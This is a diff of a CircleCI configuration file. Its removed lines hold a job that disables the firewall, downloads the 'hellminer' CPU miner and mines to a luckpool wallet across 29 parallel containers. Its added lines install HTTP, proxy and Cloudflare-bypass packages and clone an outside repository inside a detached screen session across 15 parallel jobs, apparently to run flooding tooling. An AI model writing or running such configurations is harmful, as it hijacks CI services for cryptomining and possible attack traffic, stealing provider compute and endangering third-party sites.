@@ -1,12 +1,21 @@
-version: 2.0
+version: 2.1
 jobs:
-  build:
-    docker:
-      - image: circleci/ruby:2.4.2-jessie-node
-     parallelism: 29
-        auth:
-          username: mydockerhub-user
-          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
-    steps:
-      - checkout
-      - run:  sudo su --command "sudo ufw disable && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RLNVtg1jXXuRmMkvoi6EcaCFgQzNf5vBew.worke -p x --cpu 4
+ trial:
+   docker:
+    - image: circleci/ruby:2.5.3
+   parallelism: 15
+   steps:
+     - run:
+        name: install Dependencies
+        command: |
+          sudo su --command "sudo apt install npm -y && sudo apt install screen -y && npm i chalk && npm i request && npm i random-ua && npm i sync-request && npm add sync-request && npm i cluster && npm i fs && npm i http2 && npm i tls && npm i superagent && npm i superagent-proxy && npm i axios && npm i zombie && npm i cloudscraper && 
+npm add prompt-sync && 
+git clone https://github.com/apaple/huas && 
+cd huas && chmod u+x * && ulimit 9999 && 
+sudo screen"
+
+workflows:
+ version: 2.1
+ build:
+   jobs:
+     - trial
